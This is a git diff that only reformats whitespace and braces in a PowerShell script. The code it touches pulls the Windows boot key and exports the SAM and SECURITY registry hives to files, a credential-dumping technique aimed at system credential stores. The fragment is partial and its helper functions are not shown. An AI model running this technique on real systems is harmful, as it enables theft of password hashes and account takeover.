@@ -126,11 +126,11 @@ $ascii2 = @"
 Write-Output $ascii1
 
 $CurrentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-	If (-not $CurrentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
-	{
+If (-not $CurrentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
+{
 		Write-Host ("[-] Script must be run with administrator privileges")
 		Exit
-	}
+}
 
 
 $bootKey = Get-BootKey
@@ -139,7 +139,8 @@ $bootKeyString = $hexValues -join ""
 Write-Output "[*] Boot key is: $bootKeyString"
 
 $IsSystem = [Security.Principal.WindowsIdentity]::GetCurrent().Name -eq "NT AUTHORITY\SYSTEM"
-if ($IsSystem){
+if ($IsSystem)
+{
 	Export-RegistryKey -keyPath $samKeyPath -outputPath "C:\SAM.reg"
 	Export-RegistryKey -keyPath $securityKeyPath -outputPath "C:\SECURITY.reg"
 	Write-Output $ascii2
